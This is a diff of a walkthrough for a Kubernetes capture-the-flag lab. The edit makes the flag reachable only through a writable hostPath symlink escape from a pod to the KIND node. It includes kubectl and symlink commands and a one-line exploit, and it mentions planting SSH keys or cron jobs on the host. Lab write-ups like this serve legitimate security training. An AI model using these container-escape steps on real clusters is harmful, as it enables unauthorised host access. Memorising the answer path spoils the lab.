@@ -28,7 +28,7 @@
 
 ## Attack Path Summary
 1. Pod `hostpath-pod` mounts `/var/log` from the host as a writable hostPath volume
-2. The pod also mounts `/host-flag` as a hostPath volume (containing the flag)
+2. The flag lives on the node at `/host-flag` (mounted into the node, not into the pod)
 3. Create a symlink in `/var/log` pointing to the host's `/host-flag` directory
 4. Read the flag through the symlink -- or use the writable mount to write SSH keys, cron jobs, etc.
 5. Alternatively, the symlink trick can redirect writes to escape to the host filesystem
@@ -53,13 +53,7 @@ kubectl exec -it hostpath-pod -- sh
 ls -la /host-log/
 # Expected: contents of /var/log from the KIND node
 
-# Check the flag mount
-ls -la /host-flag/
-# Expected: flag.txt
-
-# Try to read the flag directly
-cat /host-flag/flag.txt
-# Expected: flag{k8s-12-*} (if mounted correctly)
+# The flag is NOT mounted into the pod; it must be reached through the writable hostPath
 ```
 
 ### Step 3: Symlink Attack
@@ -117,16 +111,12 @@ done &
 ```bash
 # Check if the symlink attack worked
 cat /host-log/flag-link/flag.txt
-
-# If the flag is readable directly:
-cat /host-flag/flag.txt
 ```
 
 ### Step 7: Capture Flag
 - Flag format: `flag{k8s-12-*}`
 - Flag location: `/host-flag/flag.txt` on the KIND node
 - Access methods:
-  - Direct read: `cat /host-flag/flag.txt` (if mounted)
   - Symlink escape: `ln -sf /host-flag /host-log/flag-link && cat /host-log/flag-link/flag.txt`
 - Expected output: `flag{k8s-12-default}` (or custom value from `CVE_FLAG`)
 
@@ -144,7 +134,7 @@ kubectl exec hostpath-pod -- ls -la /host-log/
 kubectl exec hostpath-pod -- ls -la /host-flag/
 
 # Quick exploit verification (single line)
-kubectl exec hostpath-pod -- sh -c 'ln -sf /host-flag /host-log/flag-link 2>/dev/null; cat /host-log/flag-link/flag.txt 2>/dev/null || cat /host-flag/flag.txt'
+kubectl exec hostpath-pod -- sh -c 'ln -sf /host-flag /host-log/flag-link 2>/dev/null; cat /host-log/flag-link/flag.txt'
 ```
 
 ## 此场景利用了哪些知识
